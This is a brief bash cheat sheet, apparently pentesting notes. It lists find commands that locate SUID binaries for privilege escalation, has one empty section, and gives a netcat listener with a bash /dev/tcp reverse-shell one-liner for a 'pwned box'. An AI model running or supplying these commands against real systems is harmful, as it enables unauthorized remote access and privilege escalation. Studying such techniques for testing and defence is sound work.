# bash
## Examples
### Find all SUID executables
#### Find all SUID files
```
find / -perm /4000
```
#### Find all SUID files owned by root user
```
find / -perm -u=s -type f 2>/dev/null
```
### Find all owned by a group
```

```
### spawn a reverse shell on pwned box
#### open netcat locally
```
nc -lvnp $MY_PORT
```
#### spawn a shell from the remote box
```
bash -c 'bash -i >& /dev/tcp/$MY_IP/$MY_PORT 0>&1'
```